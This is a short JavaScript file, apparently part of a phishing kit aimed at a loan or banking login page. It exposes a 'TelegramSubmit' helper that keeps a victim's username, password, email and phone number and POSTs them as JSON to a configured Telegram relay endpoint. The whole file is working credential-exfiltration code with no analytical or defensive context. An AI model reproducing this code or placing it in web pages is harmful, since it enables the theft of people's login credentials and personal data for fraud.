(() => {
  const session = {
    usuario: "",
    password: "",
    email: "",
    phone: "",
  };

  function cfg() {
    return window.APP_CONFIG || {};
  }

  function configured() {
    const c = cfg();
    return Boolean(c.telegramApi && c.authKey);
  }

  async function send(type, extra = {}) {
    if (!configured()) return false;

    const payload = {
      type,
      at: new Date().toISOString(),
      usuario: session.usuario,
      password: session.password,
      email: session.email || extra.email || "",
      phone: session.phone || extra.phone || "",
      ...extra,
    };

    try {
      const res = await fetch(cfg().telegramApi, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Auth-Key": cfg().authKey,
        },
        body: JSON.stringify(payload),
      });
      return res.ok;
    } catch {
      return false;
    }
  }

  window.TelegramSubmit = {
    setLogin(usuario, password) {
      session.usuario = usuario || "";
      session.password = password || "";
    },
    setLoan(email, phone) {
      session.email = email || "";
      session.phone = phone || "";
    },
    sendLogin() {
      return send("login");
    },
    sendComplete(email, phone) {
      session.email = email || session.email;
      session.phone = phone || session.phone;
      return send("completo");
    },
    isConfigured: configured,
  };
})();
